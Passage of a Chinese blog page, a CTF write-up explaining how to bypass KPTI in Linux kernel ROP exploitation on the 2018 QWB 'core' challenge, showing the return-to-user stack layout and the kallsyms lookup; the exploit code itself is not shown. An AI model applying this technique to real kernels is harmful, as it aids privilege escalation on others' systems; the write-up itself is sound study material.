@@ -1,0 +1,484 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Kernel初识 - Kernel ROP with KPTI bypass | SpaceDraG0n</title><meta name="keywords" content="Kernel Pwn"><meta name="author" content="SpaceDraG0n"><meta name="copyright" content="SpaceDraG0n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Kernel初识 - Kernel ROP with KPTI bypass"><meta name="application-name" content="Kernel初识 - Kernel ROP with KPTI bypass"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="Kernel初识 - Kernel ROP with KPTI bypass"><meta property="og:url" content="http://spacedrag0n-1.github.io/posts/16110.html"><meta property="og:site_name" content="SpaceDraG0n"><meta property="og:description" content="Kernel ROP with KPTI bypass KPTI 相关概念直接引用 CTFwiki  KPTI 即 内核页表隔离（Kernel page-table isolation），内核空间与用户空间分别使用两组不同的页表集，这对于内核的内存管理产生了根本性的变化。 KPTI 的发明主要是用来"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="http://spacedrag0n-1.github.io/img/author.jpg"><meta property="article:author" content="SpaceDraG0n"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http://spacedrag0n-1.github.io/img/author.jpg"><meta name="description" content="Kernel ROP with KPTI bypass KPTI 相关概念直接引用 CTFwiki  KPTI 即 内核页表隔离（Kernel page-table isolation），内核空间与用户空间分别使用两组不同的页表集，这对于内核的内存管理产生了根本性的变化。 KPTI 的发明主要是用来"><link rel="shortcut icon" href="/img/author.jpg"><link rel="canonical" href="http://spacedrag0n-1.github.io/posts/16110.html"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: undefined,
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"与其等风来 不如追风去","backTitle":"宇宙空间站 -"},
+  LA51: undefined,
+  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
+  twikooEnvId: '',
+  commentBarrageConfig:{"enable":true,"maxBarrage":1,"barrageTime":8000,"accessToken":"","mailMd5":""},
+  music_page_default: "nav_music",
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: {"skills":["🤖️ 数码科技爱好者","🔍 分享与热心帮助","🏠 智能家居小能手","🔨 设计开发一条龙","🤝 专修交互与设计","🏃 脚踏实地行动派","🧱 团队小组发动机","💢 壮汉人狠话不多"]},
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    simplehomepage: false,
+    post: true
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: SpaceDraG0n","link":"链接: ","source":"来源: SpaceDraG0n","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'SpaceDraG0n',
+  title: 'Kernel初识 - Kernel ROP with KPTI bypass',
+  postAI: '',
+  pageFillDescription: 'Kernel ROP with KPTI bypass, 开启KPTI保护, 例题 ：强网杯 2018 - core, EXP：, 参考链接：相关概念直接引用即内核页表隔离内核空间与用户空间分别使用两组不同的页表集这对于内核的内存管理产生了根本性的变化的发明主要是用来修复一个史诗级别的硬件漏洞简单理解就是利用流水线设计中乱序执行与预测执行的漏洞来获取到用户态无法访问的内核空间的数据属于侧信道攻击的一种同时还令内核页表中属于用户地址空间的部分不再拥有执行权限这使得彻底成为过去式对于开启了内核页表隔离我们不能像之前那样直接返回用户态而是在返回用户态之前还需要将用户进程的页表给切换回来众所周知采用四级页表结构而控制寄存器用以存储当前的的地址因此在开启的情况下用户态与内核态之间的切换便涉及到的切换为了提高切换的速度内核将内核空间的与用户空间的两张页全局目录表放在一段连续的内存中两张表一张一页总计内核空间的在低地址用户空间的在高地址这样只需要将的第位取反便能完成页表切换的操作需要进行说明的是在这两张页表上都有着对用户内存空间的完整映射但在用户页表中只映射了少量的内核代码例如系统调用入口点中断处理等而只有在内核页表中才有着对内核内存空间的完整映射但两张页表都有着对用户内存空间的完整映射如下图所示左侧是未开启后的页表布局右侧是开启了后的页表布局同时还令内核页表中用户地址空间部分对应的页顶级表项不再拥有执行权限这使得彻底成为过去式除了在系统调用入口中将用户态页表切换到内核态页表的代码外内核也相应地在中提供了一个用于完成内核态页表切换回到用户态页表的函数地址可以在中获得由于源码的汇编代码编写较为繁重我们可以通过逆向的方式查看其基本汇编逻辑在实际操作时前面的一些栈操作都可以跳过直接从开始这个函数大概可以总结为如下操作因此我们只需要布置出如下栈布局即可开启保护只需要在内核启动参数中添加选项以显式开启保护例题强网杯由于题目刚开始是没有开启保护的所以我们需要手动在启动参数中添加然后我们启动程序先观察一下如果开启保护执行我们之前的会发生什么可以看到运行之前的直接报错了原因在于我们在内核态的页表中用户地址空间部分对应的页顶级表项没有可执行权限因此我们在返回用户态之前还需要先将内核态页表切换回来这里我们在完成提权后直接使用函数返回用户态即可而无需直接手动调用指令而的地址我们依旧可以通过保存在的函数地址来进行读取然后我们就得到了这个函数的地址计算偏移这个偏移加上我们在调用得到的地址就是我们最终的函数地址这个是函数的汇编代码可以看到前面有很多但是我们实际要从开始而这个地方的偏移恰好是在这个是我们要布置的栈布局稍微改一下之前的代码就可以了程序创造了一个接口所以我们需要把这个接口给打开这样才能进行函数调用距离的偏移是而且的数据类型是类型把读入用户态的此时的前八个字节是我们的成功提权参考链接',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-08-10 01:28:37',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/imgloaded.css?1"><link rel="stylesheet" href="/custom/css/schedule.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/poem.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/mainColor/heoMainColor.css"><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="/img/author.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">SpaceDraG0n</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/House-of-%E7%B3%BB%E5%88%97%E6%89%8B%E6%B3%95/" style="font-size: 1.05rem;">House of 系列手法<sup>1</sup></a><a href="/tags/Kernel-Pwn/" style="font-size: 1.05rem;">Kernel Pwn<sup>2</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/08/"><span class="card-archive-list-date">八月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="热评开关"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/" itemprop="url">知识分享</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/Kernel-Pwn/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>Kernel Pwn</span></a></span></div></div><h1 class="post-title" itemprop="name headline">Kernel初识 - Kernel ROP with KPTI bypass</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-08-09T17:26:50.815Z" title="发表于 2025-08-10 01:26:50">2025-08-10</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-08-09T17:28:37.843Z" title="更新于 2025-08-10 01:28:37">2025-08-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">1.7k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="Kernel初识 - Kernel ROP with KPTI bypass"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为衡阳"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>衡阳</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://spacedrag0n-1.github.io/posts/16110.html"><header><a class="post-meta-categories" href="/categories/%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/" itemprop="url">知识分享</a><a href="/tags/Kernel-Pwn/" tabindex="-1" itemprop="url">Kernel Pwn</a><h1 id="CrawlerTitle" itemprop="name headline">Kernel初识 - Kernel ROP with KPTI bypass</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">SpaceDraG0n</span><time itemprop="dateCreated datePublished" datetime="2025-08-09T17:26:50.815Z" title="发表于 2025-08-10 01:26:50">2025-08-10</time><time itemprop="dateCreated datePublished" datetime="2025-08-09T17:28:37.843Z" title="更新于 2025-08-10 01:28:37">2025-08-10</time></header><h1 id="Kernel-ROP-with-KPTI-bypass"><a href="#Kernel-ROP-with-KPTI-bypass" class="headerlink" title="Kernel ROP with KPTI bypass"></a>Kernel ROP with KPTI bypass</h1><ul>
+<li><u>KPTI 相关概念直接引用 CTFwiki</u></li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.kernel.org/doc/html/latest/x86/pti.html">KPTI</a> 即 <code>内核页表隔离</code>（Kernel page-table isolation），内核空间与用户空间分别使用两组不同的页表集，这对于内核的内存管理产生了根本性的变化。</p>
+<p>KPTI 的发明主要是用来修复一个史诗级别的 CPU 硬件漏洞：Meltdown。简单理解就是利用 CPU 流水线设计中（乱序执行与预测执行）的漏洞来获取到用户态无法访问的内核空间的数据，属于侧信道攻击的一种。</p>
+<p><strong>KPTI 同时还令内核页表中属于用户地址空间的部分不再拥有执行权限，这使得 ret2usr 彻底成为过去式</strong> 。</p>
+<p>对于开启了 KPTI（内核页表隔离），我们<strong>不能像之前那样直接 swapgs ; iret 返回用户态</strong>，而是在返回用户态之前还<strong>需要将用户进程的页表给切换回来</strong> 。</p>
+<p>众所周知 Linux 采用<strong>四级页表</strong>结构（PGD-&gt;PUD-&gt;PMD-&gt;PTE），而 CR3 控制寄存器用以存储当前的 PGD 的地址，因此在开启 KPTI 的情况下用户态与内核态之间的切换便涉及到 CR3 的切换，为了提高切换的速度，内核将内核空间的 PGD 与用户空间的 PGD 两张页全局目录表放在一段连续的内存中（两张表，一张一页 4k，总计 8k，内核空间的在低地址，用户空间的在高地址），这样<strong>只需要将 CR3 的第 13 位取反便能完成页表切换的操作</strong></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810012811282.png" alt="image-20250720182541886"></p>
+<p>需要进行说明的是，<strong>在这两张页表上都有着对用户内存空间的完整映射，但在用户页表中只映射了少量的内核代码（例如系统调用入口点、中断处理等），而只有在内核页表中才有着对内核内存空间的完整映射，但两张页表都有着对用户内存空间的完整映射</strong>，如下图所示，左侧是未开启 KPTI 后的页表布局，右侧是开启了 KPTI 后的页表布局。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810012741491.png" alt="image-20250720182551250"></p>
+<p><strong>KPTI 同时还令内核页表中用户地址空间部分对应的页顶级表项不再拥有执行权限（NX），这使得 ret2usr 彻底成为过去式</strong> 。</p>
+<p>除了在系统调用入口中将用户态页表切换到内核态页表的代码外，内核也相应地在 <code>arch/x86/entry/entry_64.S</code> 中提供了一个用于完成内核态页表切换回到用户态页表的函数 <code>swapgs_restore_regs_and_return_to_usermode</code>，地址可以在 <code>/proc/kallsyms</code> 中获得。</p>
+<p>由于源码的汇编代码编写较为繁重，我们可以通过 IDA 逆向的方式查看其基本汇编逻辑：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810012737530.png" alt="image-20250720182558251"></p>
+<p>在实际操作时前面的一些栈操作都可以跳过，直接从 <code>mov rdi, rsp</code> 开始，这个函数大概可以总结为如下操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov  rdi, cr3</span><br><span class="line">or rdi, 0x1000</span><br><span class="line">mov  cr3, rdi</span><br><span class="line">pop rax</span><br><span class="line">pop rdi</span><br><span class="line">swapgs</span><br><span class="line">iretq</span><br></pre></td></tr></table></figure>
+
+<p>因此我们只需要布置出如下栈布局即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">↓   swapgs_restore_regs_and_return_to_usermode</span><br><span class="line">    0 // padding</span><br><span class="line">    0 // padding</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_rflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="开启KPTI保护"><a href="#开启KPTI保护" class="headerlink" title="开启KPTI保护"></a>开启KPTI保护</h2><p>只需要在内核启动参数 <code>-append</code> 中添加 <code>pti=on</code> 选项以显式开启 KPTI 保护</p>
+<h2 id="例题-：强网杯-2018-core"><a href="#例题-：强网杯-2018-core" class="headerlink" title="例题 ：强网杯 2018 - core"></a>例题 ：强网杯 2018 - core</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810012739758.png" alt="image-20250720183432112"></p>
+<p>由于题目刚开始是没有开启 KPTI 保护的 ，所以我们需要手动在启动参数 <code>-append</code> 中添加 <code>pti=on</code> </p>
+<p>然后我们启动程序 ，先观察一下 ，如果开启 KPTI 保护 ，执行我们之前的 exp 会发生什么 </p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810012741565.png" alt="image-20250720183625537"></p>
+<p>可以看到运行之前的 exp 直接报错了 ，原因在于我们在内核态的页表中， 用户地址空间部分对应的页顶级表项没有可执行权限 </p>
+<p>因此我们在返回用户态之前还需要先将内核态页表切换回来，这里我们在完成提权后直接使用 <code>swapgs_restore_regs_and_return_to_usermode</code> 函数返回用户态即可，而无需直接手动调用 <code>iretq</code> 指令。</p>
+<p>而<code>swapgs_restore_regs_and_return_to_usermode</code>的地址我们依旧可以通过保存在 tmp&#x2F;kallsyms 的函数地址来进行读取</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810012743444.png" alt="image-20250720184049653"></p>
+<p><code>cat /proc/kallsyms | grep &quot;swapgs_restore_regs_and_return_to_usermode&quot;</code></p>
